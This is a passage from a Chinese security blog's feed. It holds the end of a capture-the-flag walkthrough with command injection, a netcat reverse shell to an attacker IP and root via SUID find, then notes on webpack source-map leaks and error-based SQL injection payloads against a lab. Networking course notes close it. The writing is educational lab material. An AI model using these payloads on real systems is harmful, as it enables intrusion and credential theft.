class="number">36</span></span><br></pre></td></tr></table></figure><p>fuzz出参数cmd</p><blockquote><p>这里的 –hw 36是后面加上的，因为页面正常访问的响应包的字数是36个，如果命令执行成功后响应包的字应该更多。于是加上–hw 忽略返回字数为36的结果排除干扰信息。</p></blockquote><h3 id="手工测试命令注入"><a href="#手工测试命令注入" class="headerlink" title="手工测试命令注入"></a>手工测试命令注入</h3><p>手工测试一下，浏览器输入以下url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.146/workinginprogress.php?cmd=id</span><br></pre></td></tr></table></figure><p>页面出现了回显结果</p><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br></pre></td></tr></table></figure><p>www-data是一个linux发行版安装web服务器软件时自动创建的系统用户账户。权限较低，被限制为仅拥有访问web服务器相关文件和目录的权限</p></blockquote><p>说明存在命令执行，进一步尝试获得shell。</p><h3 id="尝试获得shell"><a href="#尝试获得shell" class="headerlink" title="尝试获得shell"></a>尝试获得shell</h3><p>先查看有没有安装nc（netcat），如果有的话可以反弹shell</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l | grep netcat</span><br></pre></td></tr></table></figure><p>返回信息：</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231030181128691.png" alt="image-20231030181128691"></p><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ii netcat-traditional <span class="number">1</span>.<span class="number">10</span>-<span class="number">41</span>.<span class="number">1</span> amd64 TCP/IP swiss army knife </span><br></pre></td></tr></table></figure><p>已安装</p></blockquote><p>那么可以先在kali开启nc监听，然后靶机nc请求反弹shell连接</p><h3 id="使用netcat反弹shell"><a href="#使用netcat反弹shell" class="headerlink" title="使用netcat反弹shell"></a>使用netcat反弹shell</h3><p>攻击机：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp <span class="number">1234</span></span><br></pre></td></tr></table></figure><p>靶机：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash <span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">19</span> <span class="number">1234</span></span><br></pre></td></tr></table></figure><h4 id="小技巧，让shell交互性升级"><a href="#小技巧，让shell交互性升级" class="headerlink" title="小技巧，让shell交互性升级"></a>小技巧，让shell交互性升级</h4><p>如果目标机器安装了python，那么可以</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export TERM=xterm-<span class="built_in">color</span></span><br></pre></td></tr></table></figure><p>这样会启动一个新的shell，用python启动的这个shell交互性更强，更直观好看。第二局是设置环境变量，这么设置后可以允许清屏。</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="提权前的思路确定"><a href="#提权前的思路确定" class="headerlink" title="提权前的思路确定"></a>提权前的思路确定</h3><h4 id="查看是否有自动任务"><a href="#查看是否有自动任务" class="headerlink" title="查看是否有自动任务"></a>查看是否有自动任务</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">www-data@bossplayers:/var/www/html$ cat /etc/crontab</span><br><span class="line">cat /etc/crontab</span><br><span class="line"># /etc/crontab: system-wide crontab</span><br><span class="line"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="line"># command to install the new version when you edit this file</span><br><span class="line"># and files <span class="keyword">in</span> /etc/cron.d. These files also have username fields,</span><br><span class="line"># that none of the other crontabs <span class="keyword">do</span>.</span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line"><span class="built_in">PATH</span>=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line"># Example of job definition:</span><br><span class="line"># .---------------- minute (<span class="number">0</span> - <span class="number">59</span>)</span><br><span class="line"># |  .------------- hour (<span class="number">0</span> - <span class="number">23</span>)</span><br><span class="line"># |  |  .---------- day of month (<span class="number">1</span> - <span class="number">31</span>)</span><br><span class="line"># |  |  |  .------- month (<span class="number">1</span> - <span class="number">12</span>) OR jan,feb,mar,apr ...</span><br><span class="line"># |  |  |  |  .---- day of week (<span class="number">0</span> - <span class="number">6</span>) (Sunday=<span class="number">0</span> or <span class="number">7</span>) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="line"># |  |  |  |  |</span><br><span class="line"># *  *  *  *  * user-name command to be executed</span><br><span class="line"><span class="number">17</span> *    * * *   root    <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line"><span class="number">25</span> <span class="number">6</span>    * * *   root    test -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line"><span class="number">47</span> <span class="number">6</span>    * * <span class="number">7</span>   root    test -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line"><span class="number">52</span> <span class="number">6</span>    <span class="number">1</span> * *   root    test -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br></pre></td></tr></table></figure><p>没有自动任务</p></blockquote><h4 id="查看是否有全局可写文件"><a href="#查看是否有全局可写文件" class="headerlink" title="查看是否有全局可写文件"></a>查看是否有全局可写文件</h4><p>从根目录查询系统中具有suid权限位的文件</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">www-data@bossplayers:/var/www/html$ <span class="built_in">find</span> / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line"><span class="built_in">find</span> / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/grep</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/<span class="built_in">find</span></span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/lib/dbus-<span class="number">1</span>.<span class="number">0</span>/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br></pre></td></tr></table></figure></blockquote><h3 id="GFTOBins-查询提权方法"><a href="#GFTOBins-查询提权方法" class="headerlink" title="GFTOBins 查询提权方法"></a>GFTOBins 查询提权方法</h3><p>最终查询到使用find可以进行提权</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> . -exec /bin/bash -p \;</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">find</span> . -exec /bin/bash -p \;    </span><br><span class="line"><span class="built_in">find</span> . -exec /bin/bash -p \;</span><br><span class="line">bash-<span class="number">5</span>.<span class="number">0</span># whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>成功</p></blockquote><h4 id="关于这句命令做了什么"><a href="#关于这句命令做了什么" class="headerlink" title="关于这句命令做了什么"></a>关于这句命令做了什么</h4><blockquote><p>这个命令的作用是在当前目录（<code>./</code>）及其子目录中使用 <code>find</code> 命令来查找文件，然后对每个找到的文件执行 <code>/bin/sh -p</code> 命令。</p><p>具体解释如下：</p><ul><li><code>./find</code>: 这部分是在当前目录下查找名为 <code>find</code> 的文件（或可执行文件），然后运行它。这假定存在一个名为 <code>find</code> 的可执行文件，该文件将在当前目录或系统 PATH 中找到。</li><li><code>-exec</code>: 这是 <code>find</code> 命令的选项，用于在找到的每个文件上执行指定的命令。</li><li><code>/bin/sh -p</code>: 这是 <code>-exec</code> 选项后的命令部分。它会在每个找到的文件上运行 <code>/bin/sh -p</code>，即以 <code>sh</code> shell 的交互模式运行，其中 <code>-p</code> 是为了保持权限。通常，<code>-p</code> 选项用于防止 shell 清除环境变量，以便维持特权级别。</li><li><code>\;</code>: 这表示 <code>-exec</code> 命令的结束。</li></ul><p>总的来说，这个命令的目的是在当前目录及其子目录中查找文件，并在找到的第一个文件上以特权权限运行交互式 shell (<code>/bin/sh -p</code>)。这种操作通常用于测试或渗透测试中，用于尝试提权或执行其他特权操作。这需要非常小心，因为它可能引起系统安全问题，特别是在未经授权的情况下。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 打靶 </category>
          
          <category> bossplayersCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webpack源码泄露漏洞</title>
      <link href="/2023/11/18/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/webpack%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/11/18/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/webpack%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="webpack源码泄露"><a href="#webpack源码泄露" class="headerlink" title="webpack源码泄露"></a>webpack源码泄露</h1><p>本文参考内容：</p><p><a href="https://blog.csdn.net/weixin_43571641/article/details/121689764">https://blog.csdn.net/weixin_43571641/article/details/121689764</a></p><p><a href="https://blog.csdn.net/weixin_43571641/article/details/121689764">https://blog.csdn.net/weixin_43571641/article/details/121689764</a></p><h2 id="webpack是什么"><a href="#webpack是什么" class="headerlink" title="webpack是什么"></a>webpack是什么</h2><blockquote><p>本质上，<strong>webpack</strong> 是一个用于现代 JavaScript 应用程序的 <em>静态模块打包工具</em>。当 webpack 处理应用程序时，它会在内部从一个或多个入口点构建一个 <a href="https://www.webpackjs.com/concepts/dependency-graph/">依赖图(dependency graph)</a>，然后将你项目中所需的每一个模块组合成一个或多个 <em>bundles</em>，它们均为静态资源，用于展示你的内容。</p></blockquote><p>WebPack可以看做是模块打包机：它做的事情是，分析你的项目结构，找到JavaScript模块以及其它的一些浏览器不能直接运行的拓展语言（Scss，TypeScript等），并将其转换和打包为合适的格式供浏览器使用。</p><h3 id="webpack的功能"><a href="#webpack的功能" class="headerlink" title="webpack的功能"></a>webpack的功能</h3><p>webpack是一个打包器（bundler），它能将多个js、css、json等文件打包成一个文件。这样可以使复杂的各种加载文件集合为整合为单一的集合，让代码更加模块化便于编程使用和浏览器加载。</p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>webpack会递归构建一个关系依赖图，其中包含应用程序需要的每个模块，然后将这些模块打包成一个或多个bundle。</p><p>如果webpack没有被正确配置，就会导致源码泄露的情况。</p><p>可能泄露api、加密算法、管理员邮箱、内部功能等等。</p><h3 id="如何判断存在webpack源码泄露"><a href="#如何判断存在webpack源码泄露" class="headerlink" title="如何判断存在webpack源码泄露"></a>如何判断存在webpack源码泄露</h3><ol><li><p>webpack项目源码泄露的情况下可以在浏览器的“来源”-&gt;webpack://中查看源代码</p></li><li><p>使用webpack打包应用程序会在网站js同目录下生成js.map文件。</p><p> ​    可以通过查看网站的js文件末尾处获知js.map的文件名。</p></li></ol><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在某些情况下，不能直接在浏览器控制台中的Sources—&gt; Page—&gt; webpack://中查看到webpack项目源码，但是网站上存在js.map文件，我们可以通过一些工具将js.map中的内容进行还原webpack项目源码。</p><p>可用工具：</p><ul><li>reverse-sourcemap</li><li>shuji</li><li>packkerfuzzer</li></ul><p>SourceDetector是一个谷歌浏览器插件，此插件可以自动的判断网站是否存在js.map文件，并且能够利用该插件直接下载到js.map的webpack项目源码</p>]]></content>
      
      
      <categories>
          
          <category> 小寄巧 </category>
          
          <category> webpack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webpack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入（三）</title>
      <link href="/2023/11/18/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>/2023/11/18/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入（三）——布尔盲注"><a href="#SQL注入（三）——布尔盲注" class="headerlink" title="SQL注入（三）——布尔盲注"></a>SQL注入（三）——布尔盲注</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><blockquote><p>盲注就是在SQL注入过程中，SQL语句执行后，查询到的数据不能回显到前端页面。此时，我们需要利 用一些方法进行判断或者尝试，这个过程称之为盲注。 </p><p>布尔盲注就是SQL语句执行后，页面不返回具体数据，数据库只返回1或者0（真or假）。类似于无法开 口说话的人，只能通过点头和摇头来告诉你答案的正确与否。</p></blockquote><h2 id="布尔盲注的特性"><a href="#布尔盲注的特性" class="headerlink" title="布尔盲注的特性"></a>布尔盲注的特性</h2><p>在页面中，如果正确执行了用户构造的 SQL 语句，则返回一种页面，如果 SQL 语句执行错误，则执行 另一种页面。基于两种页面，来判断 SQL 语句正确与否，达到获取数据的目的。</p>]]></content>
      
      
      <categories>
          
          <category> 网安基础 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入（二）</title>
      <link href="/2023/11/18/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2023/11/18/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入（二）——报错注入"><a href="#SQL注入（二）——报错注入" class="headerlink" title="SQL注入（二）——报错注入"></a>SQL注入（二）——报错注入</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><blockquote><ul><li><p>报错注入是SQL注入的一种，页面上没有显示位，但是会输出SQL语句执行错误信息。比如 mysql_error()函数的报错信息。 </p></li><li><p>盲注就是在SQL注入过程中，SQL语句执行后，查询到的数据不能回显到前端页面。此时，我们需要利 用一些方法进行判断或者尝试，这个过程称之为盲注。</p></li></ul></blockquote><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>利用数据库的某些机制，人为制造报错的条件，可以使数据库报错。</p><p>此时可以构造一些特殊的条件，导致查询结果能够出现在报错的语句中。这时候我们就能通过报错的语句来获取数据库的信息。</p><h2 id="适合使用报错注入的场景"><a href="#适合使用报错注入的场景" class="headerlink" title="适合使用报错注入的场景"></a>适合使用报错注入的场景</h2><ul><li>联合查询受限</li><li>没有合适的数据返回点</li><li>页面会发生报错，能返回错误信息</li></ul><h2 id="报错注入的分类"><a href="#报错注入的分类" class="headerlink" title="报错注入的分类"></a>报错注入的分类</h2><ul><li>xpath语法错误</li><li>bigint等数据类型溢出</li><li>count()+rand()+group_by()导致主键重复</li><li>空间数据类型函数错误</li></ul><h3 id="xpath语法错误"><a href="#xpath语法错误" class="headerlink" title="xpath语法错误"></a>xpath语法错误</h3><p>mysql在使用如updatexml() 这类与xml有关的函数时，如果传入的参数不满足xpath语法的要求，就会发生报错。</p><p>报错信息会暴露出参数中sql语句的查询结果</p><p> 常见的两个用于进行报错注入的函数：</p><ul><li>updatexml( xml_document, xpath_string, new_value)<ul><li>第1、第3个参数都无关紧要，主要是第2个参数。xpath_string 要求是一个符合xpath语法的字符串，不满足要求就会发生报错。（第一个参数是xml的内容，第二个是需要update的位置xpath路径，第三个是更新后的内容）</li></ul></li><li>extractvalue(xml_document,Xpath_string)<ul><li>与上面一样，xpath_string 是符合xpath语法要求的参数，否则就会报错。</li></ul></li></ul><h2 id="报错注入分析流程"><a href="#报错注入分析流程" class="headerlink" title="报错注入分析流程"></a>报错注入分析流程</h2><ul><li>判断是否存在注入</li><li>判断注入类型</li><li>获取数据库名</li><li>获取数据库表名</li><li>获取表中的字段</li><li>获取字段中的记录</li></ul><h3 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-5/?id=1%27</span><br></pre></td></tr></table></figure><h3 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and 1=1%23</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and 1=2%23</span><br></pre></td></tr></table></figure><p>判断出注入类型涉及到了后续的注入过程中需不需要闭合单引号（’），通过“1’ and 1=1#”和“1’ and  1=2#”进行判断，如果页面有不同的变化，则说明是字符型的注入，因为字符型的参数是需要引号引起来的。</p><h3 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> http://127.0.0.1/sqli/Less-5/?id=1&#x27; and </span><br><span class="line">updatexml(1,concat(0x7e,database(),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>假如后台sql语句为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;$id‘ </span><br></pre></td></tr></table></figure><p>当传入上面的URL后，此语句会被拼接为(下面不再重复这部分)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)#&#x27;</span><br></pre></td></tr></table></figure><h3 id="获取数据库表名"><a href="#获取数据库表名" class="headerlink" title="获取数据库表名"></a>获取数据库表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1)%23</span><br></pre></td></tr></table></figure><h3 id="获取表中的字段"><a href="#获取表中的字段" class="headerlink" title="获取表中的字段"></a>获取表中的字段</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;),0x7e),1)%23</span><br></pre></td></tr></table></figure><h3 id="获取字段中的记录"><a href="#获取字段中的记录" class="headerlink" title="获取字段中的记录"></a>获取字段中的记录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(id,username,password) from users),0x7e),1)%23</span><br></pre></td></tr></table></figure><h3 id="注：xpath报错仅会报错32个字符"><a href="#注：xpath报错仅会报错32个字符" class="headerlink" title="注：xpath报错仅会报错32个字符"></a>注：xpath报错仅会报错32个字符</h3><p>可以使用substr()截取字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(id,username,password) from users),1,31),0x7e),1)%23</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(id,username,password) from users),31,31),0x7e),1)%23</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网安基础 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概述</title>
      <link href="/2023/11/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E6%A6%82%E8%BF%B0/"/>
      <url>/2023/11/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E6%A6%82%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="第一章-概述"><a href="#第一章-概述" class="headerlink" title="第一章 概述"></a>第一章 概述</h1><h2 id="互联网的组成"><a href="#互联网的组成" class="headerlink" title="互联网的组成"></a>互联网的组成</h2><ol><li>边缘部分</li><li>核心部分</li></ol><h3 id="边缘部分"><a href="#边缘部分" class="headerlink" title="边缘部分"></a>边缘部分</h3><blockquote><p>所谓边缘部分就是连接在互联网上的所有的主机。</p></blockquote><p>边缘端系统间通信方式有两种</p><blockquote><ul><li>客户-服务器方式（c-s）</li><li>对等连接方式（p2p）</li></ul></blockquote><h3 id="核心部分"><a href="#核心部分" class="headerlink" title="核心部分"></a>核心部分</h3><blockquote><p>作用： 相边缘的主机提供连通性。</p></blockquote><p>核心部分中起到特殊作用的是路由器。路由器是一种特殊的专用计算机，是实现分组交换的关键部件。任务是转发收到的分组。</p><h3 id="三种交换方式及优缺点"><a href="#三种交换方式及优缺点" class="headerlink" title="三种交换方式及优缺点"></a>三种交换方式及优缺点</h3><ul><li>电路交换：整个报文比特流连续地从源点到达终点。若连续传送大量数据，则传输速率相较其他两种高，但传输效率低，通信线路大多数时候都是空闲的</li><li>报文交换：整个报文先传送到相邻节点存储下来，然后根据转发表转发到下一个点。</li><li>分组交换：单个分组（报文的一部分）先发送到相邻节点。相较报文交换灵活性更高，时延更小。</li></ul><hr><h2 id="计算机网络的类别"><a href="#计算机网络的类别" class="headerlink" title="计算机网络的类别"></a>计算机网络的类别</h2><h3 id="按照作用范围进行分类"><a href="#按照作用范围进行分类" class="headerlink" title="按照作用范围进行分类"></a>按照作用范围进行分类</h3><ul><li>广域网 WAN（ wide area network）</li><li>城域网 MAN（metropolitan area network）</li><li>局域网 LAN（local area network）</li><li>个人区域网 PAN（person area network）</li></ul><h3 id="按照使用者进行分类"><a href="#按照使用者进行分类" class="headerlink" title="按照使用者进行分类"></a>按照使用者进行分类</h3><ul><li>公用网</li><li>专用网</li></ul><hr><h2 id="性能指标"><a href="#性能指标" class="headerlink" title="性能指标"></a>性能指标</h2><h3 id="1-速率"><a href="#1-速率" class="headerlink" title="1. 速率"></a>1. 速率</h3><p>bit/s    kb/s    mb/s…</p><h3 id="2-带宽"><a href="#2-带宽" class="headerlink" title="2. 带宽"></a>2. 带宽</h3><p>表示单位时间内网络中信道所能通过的最高数据率</p><h3 id="3-吞吐量"><a href="#3-吞吐量" class="headerlink" title="3. 吞吐量"></a>3. 吞吐量</h3><p>单位时间内通过某个网络的实际数据量</p><h3 id="4-时延"><a href="#4-时延" class="headerlink" title="4. 时延"></a>4. 时延</h3><p>也称延迟</p><p>分为发送时延、传播时延、处理时延、排队时延</p><ul><li>发送时延=帧长/发送速率</li><li>传播时延=信道长度/电磁波在信道上的传播速率</li><li>处理时延：主机或路由器在收到分组时需要花费一定时间进行处理。</li><li>排队时延：分组转发时需要在路由器输出队列中排队等候</li></ul><h3 id="5-时延带宽积"><a href="#5-时延带宽积" class="headerlink" title="5. 时延带宽积"></a>5. 时延带宽积</h3><p>字面意思：时延和带宽相乘。详见p25</p><h3 id="6-往返时间RTT"><a href="#6-往返时间RTT" class="headerlink" title="6. 往返时间RTT"></a>6. 往返时间RTT</h3><p>信道双向交互一次所需的时间</p><h3 id="7-有效数据率"><a href="#7-有效数据率" class="headerlink" title="7. 有效数据率"></a>7. 有效数据率</h3><blockquote><p>数据长度/（发送时间+RTT）</p></blockquote><h3 id="8-利用率"><a href="#8-利用率" class="headerlink" title="8. 利用率"></a>8. 利用率</h3><p>利用率的对面就是空闲率</p><p>利用率可以用来进行网络时延的计算（在已知空闲时的时延情况下）</p><blockquote><p><strong>当前时延=空闲时时延/（未利用率）</strong></p><p><strong>未利用率=1-利用率</strong></p></blockquote><hr><h2 id="计算机网络体系结构"><a href="#计算机网络体系结构" class="headerlink" title="计算机网络体系结构"></a>计算机网络体系结构</h2><h3 id="协议三要素"><a href="#协议三要素" class="headerlink" title="协议三要素"></a>协议三要素</h3><ul><li>语法：数据与控制信息的结构和格式。</li><li>语义：需要发出何种控制信息，完成何种动作和响应。</li><li>同步：事件实现顺序的详细说明。</li></ul><h3 id="OSI五层协议体系架构表示层"><a href="#OSI五层协议体系架构表示层" class="headerlink" title="OSI五层协议体系架构表示层"></a>OSI五层协议体系架构表示层</h3><ul><li><p>应用层：通过进程间交互完成特定网络应用</p></li><li><p>运输层：完成两台主机之间进程间通信，复用和分用的核心。</p></li><li><p>网络层：为分组交换网上的主机提供通信服务。只关心源主机和目的主机。使用IP协议作为本层核心。</p></li><li><p>数据链路层：将上层的IP数据报封装成帧，在两个相邻的节点上传送帧。</p></li><li><p>物理层：所传输的数据单位时比特。但解释比特所代表的意思不是物理层的任务。物理层的任务是在物理传输媒体上把每一个帧发送出去。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> 概述 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>运输层</title>
      <link href="/2023/11/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%AC%AC%E4%BA%94%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/"/>
      <url>/2023/11/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%AC%AC%E4%BA%94%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%82/</url>
      
